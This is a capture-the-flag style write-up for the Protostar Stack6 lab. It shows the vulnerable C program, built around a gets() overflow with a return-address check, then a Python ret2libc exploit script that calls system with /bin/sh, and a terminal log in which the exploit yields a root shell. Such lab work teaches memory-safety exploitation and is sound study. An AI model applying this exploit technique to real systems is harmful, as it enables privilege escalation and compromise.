# Stack6

URL: https://exploit.education/protostar/stack-six/

Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6

Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

# Writeup

Here we have to change the return address in order to get the shell

Steps to follow:

1. get the padding using offset method
2. get the system address using `p system` in GDB
3. return to address of 41414141
4. get the `/bin/sh` address from libc lib

Exploit code

```
import struct
padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPQQQQPRRRRSSSS"
system = struct.pack("I", 0xb7ecffb0)
ret = "AAAA"
shell = struct.pack("I", 0xb7fb63bf)

print padding + system + ret + shell
```

Solution:

```
user@protostar:/tmp$ (python exploit.py; cat) | /opt/protostar/bin/stack6
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO▒▒▒QQQPRRRRSSSS▒▒▒AAAA▒c▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
